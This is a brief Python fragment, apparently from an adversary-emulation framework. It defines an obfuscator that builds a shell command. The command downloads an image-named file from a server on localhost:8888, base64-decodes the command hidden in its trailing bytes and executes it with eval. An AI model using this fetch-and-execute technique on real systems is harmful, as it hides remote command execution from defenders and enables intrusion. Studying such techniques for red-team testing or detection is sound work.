...
class Obfuscation(BaseObfuscator):
    ...
    def sh(link):
        ...
        return 'curl -s -X POST -H "file:meow-%s.jpg" localhost:8888/file/download > meow-%s.jpg;eval $(tail -c %s meow-%s.jpg | base64 --decode)' \
               % (link.id, link.id, len(link.command), link.id)
